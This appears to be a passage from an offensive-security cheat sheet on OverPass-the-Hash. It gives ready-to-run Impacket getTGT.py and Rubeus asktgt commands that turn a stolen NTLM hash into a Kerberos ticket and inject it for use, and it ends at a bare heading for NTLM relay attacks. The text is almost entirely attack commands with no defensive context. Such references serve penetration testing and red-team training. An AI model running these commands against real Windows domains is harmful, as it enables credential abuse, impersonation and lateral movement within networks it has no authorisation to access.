# OverPass-the-Hash

Convert NTLM hash to Kerberos ticket:

```bash
# Impacket
getTGT.py domain.local/user -hashes :NTHASH
export KRB5CCNAME=user.ccache

# Rubeus
.\Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt
```

---

## NTLM Relay Attacks